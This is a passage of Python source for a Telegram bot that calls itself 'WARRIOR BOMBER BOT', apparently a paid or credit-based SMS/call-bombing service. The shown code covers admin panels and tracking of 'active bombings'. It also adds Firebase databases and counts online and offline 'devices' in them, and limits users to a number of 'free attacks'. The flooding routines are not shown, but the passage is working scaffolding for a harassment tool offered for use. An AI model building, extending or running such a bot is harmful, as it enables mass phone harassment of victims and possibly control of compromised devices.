            
            msg = await update.message.reply_text("⏳ Validating Firebase...")
            stats = fetch_firebase_stats(url)
            
            if stats is None:
                await msg.edit_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ❌ ꜰɪʀᴇʙᴀꜱᴇ ᴅᴇᴀᴅ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔗 `{url}`\n\n"
                    f"Cannot fetch /clients\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ TRY AGAIN",
                                              callback_data="adm:fb_add",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 FIREBASES",
                                              callback_data="adm:fb_menu",
                                              api_kwargs={"style": "primary"})],
                    ]))
                context.user_data.pop("admin_action", None)
                return True
            
            conn = db(); c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM firebases")
            cnt = c.fetchone()[0]
            tag = f"FB{cnt + 1}"
            try:
                c.execute("INSERT INTO firebases (url, tag) VALUES (?, ?)", (url, tag))
                conn.commit()
            except Exception:
                conn.close()
                await msg.edit_text(
                    "⚠️ Firebase already added.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 FIREBASES",
                                              callback_data="adm:fb_menu",
                                              api_kwargs={"style": "primary"})],
                    ]))
                context.user_data.pop("admin_action", None)
                return True
            conn.close()
            firebase_cache[tag] = stats
            
            await msg.edit_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ✅ ꜰɪʀᴇʙᴀꜱᴇ ᴀᴅᴅᴇᴅ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔗 `{url}`\n"
                f"📊 Tag: `{tag}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   📱 ᴅᴇᴠɪᴄᴇꜱ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🟢 Online:  `{stats['online']}`\n"
                f"🔴 Offline: `{stats['offline']}`\n"
                f"📊 Total:   `{stats['total']}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛰️ VIEW FIREBASES",
                                          callback_data="adm:fb_menu",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("➕ ADD ANOTHER",
                                          callback_data="adm:fb_add",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- ADD CHANNEL ----------
        if action == "add_channel":
            ch = text.strip()
            if ch.startswith("https://t.me/"):
                ch = "@" + ch.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
            if not ch.startswith("@"):
                ch = "@" + ch
            if not re.fullmatch(r"@[A-Za-z0-9_]{5,32}", ch):
                await update.message.reply_text(
                    "❌ Invalid channel username.\nExample: `@mychannel`",
                    parse_mode="Markdown")
                return True
            try:
                chat = await context.bot.get_chat(ch)
                label = chat.title or ch
            except Exception as e:
                await update.message.reply_text(
                    f"❌ Could not access channel.\n\n"
                    f"Make sure bot is admin in `{ch}`.",
                    parse_mode="Markdown")
                return True
            
            # Check duplicate
            chs = get_force_channels()
            if any(c["id"].lower() == ch.lower() for c in chs):
                await update.message.reply_text("⚠️ Channel already added.")
                context.user_data.pop("admin_action", None)
                return True
            
            conn = db(); c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO force_channels (id, label, url) VALUES (?, ?, ?)",
                      (ch, label, f"https://t.me/{ch.lstrip('@')}"))
            conn.commit(); conn.close()
            
            with _join_lock: _join_cache.clear()
            
            await update.message.reply_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ✅ ᴄʜᴀɴɴᴇʟ ᴀᴅᴅᴇᴅ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📢 {label}\n"
                f"🆔 `{ch}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📢 VIEW CHANNELS",
                                          callback_data="adm:channels_menu",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("➕ ADD ANOTHER",
                                          callback_data="adm:add_channel",
                                          api_kwargs={"style": "success"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- BROADCAST ----------
        if action == "bc_all":
            conn = db(); c = conn.cursor()
            c.execute("SELECT user_id FROM users")
            rows = c.fetchall(); conn.close()
            
            msg = await update.message.reply_text(
                f"📢 Broadcasting to {len(rows)} users...")
            
            sent = 0; failed = 0
            for (target_id,) in rows:
                try:
                    await context.bot.send_message(
                        target_id,
                        f"📢 *ANNOUNCEMENT*\n\n{text}",
                        parse_mode="Markdown")
                    sent += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(0.05)
            
            try:
                await msg.edit_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ✅ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴅᴏɴᴇ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📨 Sent: `{sent}`\n"
                    f"❌ Failed: `{failed}`\n"
                    f"📊 Total: `{len(rows)}`\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown")
            except Exception:
                await update.message.reply_text(
                    f"✅ Sent: {sent}, Failed: {failed}")
            
            context.user_data.pop("admin_action", None)
            return True
    
    except Exception as e:
        log.error(f"admin_input error: {e}")
        await update.message.reply_text(f"❌ Error: {e}")
        context.user_data.pop("admin_action", None)
        return True
    
    return False
# ===================== ERROR HANDLER =====================
async def error_handler(update, context):
    """Global error handler — prevents bot crash"""
    try:
        err = context.error
        log.error(f"[ERROR] {err}", exc_info=err)
        if update and getattr(update, "effective_message", None):
            try:
                await update.effective_message.reply_text(
                    "❌ Something went wrong. Please try again.")
            except Exception:
                pass
    except Exception:
        pass

# ===================== CLEANUP TASK =====================
async def cleanup_task():
    """Background cleanup — every 5 min"""
    while True:
        try:
            await asyncio.sleep(300)
            now = time.time()
            
            # Cleanup stale bombing states
            for uid_ in list(active_bombings_detail.keys()):
                info = active_bombings_detail.get(uid_, {})
                if not bombing_active.get(uid_) and \
                   now - info.get("started", now) > 600:
                    active_bombings_detail.pop(uid_, None)
                    request_counts.pop(uid_, None)
                    bombing_threads.pop(str(uid_), None)
            
            # Cleanup stale join cache
            with _join_lock:
                stale = [u_ for u_, t_ in _join_cache.items() if now - t_ > 600]
                for u_ in stale:
                    _join_cache.pop(u_, None)
            
            # Log
            active = sum(1 for v in bombing_active.values() if v)
            log.info(f"[CLEANUP] Active bombings: {active} | Stale cleared")
        except Exception as e:
            log.error(f"cleanup_task: {e}")

# ===================== FIREBASE AUTO-REFRESH =====================
async def firebase_refresh_task():
    """Auto-refresh Firebase stats every 3 min"""
    while True:
        try:
            await asyncio.sleep(AUTO_REFRESH_SEC)
            fbs = get_firebases()
            if not fbs: continue
            for fb in fbs:
                stats = fetch_firebase_stats(fb["url"])
                if stats:
                    firebase_cache[fb["tag"]] = stats
            log.info(f"[FIREBASE] Refreshed {len(fbs)} Firebases")
        except Exception as e:
            log.error(f"firebase_refresh_task: {e}")

# ===================== POST INIT =====================
async def post_init(application):
    """Start background tasks"""
    try:
        asyncio.create_task(cleanup_task())
        asyncio.create_task(firebase_refresh_task())
        log.info("[INIT] Background tasks started")
        
        # Get bot info
        me = await application.bot.get_me()
        log.info(f"[BOT] @{me.username} started")
    except Exception as e:
        log.error(f"post_init: {e}")

# ===================== MAIN =====================
def main():
    print("=" * 60)
    print("   WARRIOR BOMBER BOT")
    print("=" * 60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:20]}...")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"👮 Admin IDs: {ADMIN_IDS}")
    print(f"🔌 APIs: {len(APIS)}")
    print(f"⚡ Threads: {THREAD_COUNT}")
    print(f"🛡️ Max Handlers: {MAX_CONCURRENT_HANDLERS}")
    print(f"🛡️ Max Workers: {MAX_GLOBAL_WORKERS}")
    print(f"🎯 Free Attacks: {FREE_ATTACKS}")
    print(f"⏱️  Refill: {REFILL_HOURS}h")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print(f"💬 Support: {SUPPORT_USERNAME}")
    print("=" * 60)
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(join_callback, pattern=r"^join_"))
    app.add_handler(CallbackQueryHandler(
        user_callback,
        pattern=r"^(bomb:|bomb_type:|user:|rc:)"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern=r"^adm:"))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    # Error handler
    app.add_error_handler(error_handler)
    
    # Post init
    app.post_init = post_init
    
    print("\n🚀 Bot is starting...")
    print("=" * 60)
    
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

# ===================== ENTRY =====================
if __name__ == "__main__":
    main()
